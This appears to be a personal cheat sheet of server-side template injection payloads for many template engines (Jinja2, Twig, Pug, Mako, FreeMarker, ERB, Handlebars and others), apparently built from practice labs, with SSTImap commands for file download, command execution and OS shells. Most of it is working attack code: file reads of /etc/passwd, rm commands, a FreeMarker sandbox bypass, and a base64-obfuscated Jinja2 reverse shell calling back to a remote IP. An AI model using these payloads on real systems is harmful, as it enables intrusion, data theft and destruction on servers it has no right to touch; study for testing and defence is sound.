#php #nodejs #python
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

1. **Jinja2 (python)/Twig (PHP)** - `{{7*'7'}}`
2. **Jade/Pug** (Node)
	* `#{7 * 7}`
3. Smarty (PHP) - `{'Hello'|upper}`
4. Pug (node)
	* `#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`
5. Mako (python)
	* ${7 * 7}
6. handlebars (node)
	* `{{7+7}}`

##### Automation
```bash
git clone https://github.com/vladko312/SSTImap.git

python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='

# Download remote file
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

# Execute remote command
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

# OS shell
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

#### Apache FreeMarker #java 
```marker
<#assign rt = "freemarker.template.utility.Execute"?new()>
${rt("rm -rf /something")}
```
Detect version:
```
${.version}
```
Sandbox bypass (works <= v2.39):
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
Do not forget to replace `article` with available entity.

#### Mako #python 
```mako
<%
	import os
	x=os.popen('id').read()
%>
${x}
```
// what the fuck is ${x} ?
// not sure if it works

#### Tornado #python 
```tornado
user.name}}{%25import+os%25}{{os.system('rm+/home/carlos/morale.txt')}}
```

#### Twig
[[SSTI twig]]
```twig
{{['id',""]|sort('passthru')}}

{{ _self }}

{{ "/etc/passwd"|file_excerpt(1,-1) }}

{{ ['id'] | filter('system') }}
```

#### [[ERB]]  #ruby
```ruby
<%= eval('system("whoami")') %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
<%= File.read("/etc/passwd") %>
```
#### [[jinja]]
```jinja2
{{ config.items() }}

{{ self.__init__.__globals__.__builtins__ }}

{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}

{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZG
V2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
```

# html/templates #go
https://www.onsecurity.io/blog/go-ssti-method-research/
someFunction is a function in current scope that reads and returns content of a file
```go
{{.someFunction "/flag.txt"}}
```

#### handlebars #nodejs 
Exploit:
```handlebars
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

##### Identification guide
![[identify SSTI.png]]